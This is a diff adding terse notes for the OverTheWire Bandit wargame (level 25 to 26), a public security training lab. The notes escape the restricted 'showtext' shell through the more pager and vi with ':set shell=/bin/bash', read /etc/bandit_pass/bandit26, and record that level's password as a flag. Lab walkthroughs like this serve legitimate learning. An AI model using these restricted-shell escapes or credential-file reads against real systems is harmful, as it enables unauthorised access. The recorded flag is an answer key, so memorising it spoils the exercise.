@@ -1,0 +1,17 @@
+copy the sshkey in this directory
+cat /etc/passwd | grep bandit 26
+
+cat /usr/bin/showtext
+
+ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220 (in small shell window)
+v
+:e /etc/bandit_pass/bandit26
+
+flag : 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+v
+:set shell=/bin/bash
+:shell
+whoami
+
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220
